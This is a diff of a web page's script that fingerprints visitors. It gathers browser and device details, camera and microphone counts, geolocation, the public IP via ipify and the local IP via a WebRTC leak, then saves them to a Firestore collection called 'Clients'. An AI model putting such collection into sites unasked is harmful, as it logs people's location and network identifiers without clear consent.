@@ -61,9 +61,10 @@
         };
 
         const app = initializeApp(firebaseConfig);
-        const DB_NAME = "fishbibon";
-        const db = getFirestore(app, DB_NAME);
+
+        const db = getFirestore(app); // ✅ default Firestore
         const auth = getAuth(app);
+
         const COLLECTION_NAME = "Clients";
 
         // DOM элементы
@@ -118,11 +119,11 @@
             try {
                 data.timestamp = new Date().toISOString();
                 data.pageUrl = location.href;
-                data.firestoreDb = DB_NAME;
+                data.firestoreDb = "(default)"; // можно вообще удалить эту строку
 
                 const docRef = await addDoc(collection(db, COLLECTION_NAME), data);
-                console.log("Saved to fishbibon. Doc ID:", docRef.id);
-                firestoreStatus.innerHTML = `✅ Данные сохранены в Firestore "${DB_NAME}" (ID: ${docRef.id})`;
+                console.log("Saved to Firestore (default). Doc ID:", docRef.id);
+                firestoreStatus.innerHTML = `✅ Данные сохранены в Firestore (default) (ID: ${docRef.id})`;
                 firestoreStatus.style.color = "green";
             } catch (error) {
                 console.error("Ошибка при записи в Firestore:", error);
@@ -131,25 +132,25 @@
             }
         }
 
-        // Получение публичного IP через api.ipify.org
+        // Публичный IP
         function getPublicIP() {
-            return fetch('https://api.ipify.org?format=json')
-                .then(res => res.json())
-                .then(data => data.ip)
-                .catch(() => 'не удалось определить');
+            return fetch("https://api.ipify.org?format=json")
+                .then((res) => res.json())
+                .then((data) => data.ip)
+                .catch(() => "не удалось определить");
         }
 
-        // Получение локального IP через WebRTC
+        // Локальный IP (WebRTC)
         function getLocalIP() {
             return new Promise((resolve) => {
                 if (!window.RTCPeerConnection) {
-                    resolve('не поддерживается');
+                    resolve("не поддерживается");
                     return;
                 }
                 const pc = new RTCPeerConnection({ iceServers: [] });
                 let ipFound = false;
-                pc.createDataChannel(''); // необходимо для инициации ICE
-                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => { });
+                pc.createDataChannel("");
+                pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => { });
                 pc.onicecandidate = (event) => {
                     if (event.candidate) {
                         const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
@@ -160,19 +161,17 @@
                             pc.close();
                         }
                     } else {
-                        // Кандидаты закончились, IP не найден
                         setTimeout(() => {
                             if (!ipFound) {
-                                resolve('не удалось определить');
+                                resolve("не удалось определить");
                                 pc.close();
                             }
                         }, 500);
                     }
                 };
-                // Таймаут на случай зависания
                 setTimeout(() => {
                     if (!ipFound) {
-                        resolve('таймаут');
+                        resolve("таймаут");
                         pc.close();
                     }
                 }, 3000);
@@ -181,10 +180,8 @@
 
         // Главная функция
         (async function main() {
-            // Авторизация
             initAuth();
 
-            // Базовая информация (синхронно)
             addInfo("User Agent", navigator.userAgent);
             addInfo("Платформа", navigator.platform);
             addInfo("Язык", navigator.language);
@@ -221,12 +218,12 @@
                 addInfo("Battery API", "не поддерживается");
             }
 
-            // Медиа-устройства
+            // Устройства
             if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
                 try {
                     const devices = await navigator.mediaDevices.enumerateDevices();
-                    const video = devices.filter(d => d.kind === "videoinput").length;
-                    const audio = devices.filter(d => d.kind === "audioinput").length;
+                    const video = devices.filter((d) => d.kind === "videoinput").length;
+                    const audio = devices.filter((d) => d.kind === "audioinput").length;
                     addInfo("Камеры", video);
                     addInfo("Микрофоны", audio);
                 } catch (e) {
@@ -236,7 +233,6 @@
                 addInfo("enumerateDevices", "не поддерживается");
             }
 
-            // Асинхронные операции: геолокация, публичный IP, локальный IP
             const geoPromise = new Promise((resolve) => {
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
@@ -269,20 +265,17 @@
                 }
             });
 
-            const publicIPPromise = getPublicIP().then(ip => {
+            const publicIPPromise = getPublicIP().then((ip) => {
                 addInfo("Публичный IP", ip);
-                setStatus(publicIpStatus, ip.includes('не удалось') ? 'error' : 'success', ip);
+                setStatus(publicIpStatus, ip.includes("не удалось") ? "error" : "success", ip);
             });
 
-            const localIPPromise = getLocalIP().then(ip => {
+            const localIPPromise = getLocalIP().then((ip) => {
                 addInfo("Локальный IP", ip);
-                setStatus(localIpStatus, ip.includes('не удалось') || ip.includes('не поддерживается') ? 'error' : 'success', ip);
+                setStatus(localIpStatus, ip.includes("не удалось") || ip.includes("не поддерживается") ? "error" : "success", ip);
             });
 
-            // Дожидаемся всех асинхронных данных
             await Promise.all([geoPromise, publicIPPromise, localIPPromise]);
-
-            // Сохраняем всё в Firestore
             await saveToFirestore(collectedData);
         })();
     </script>
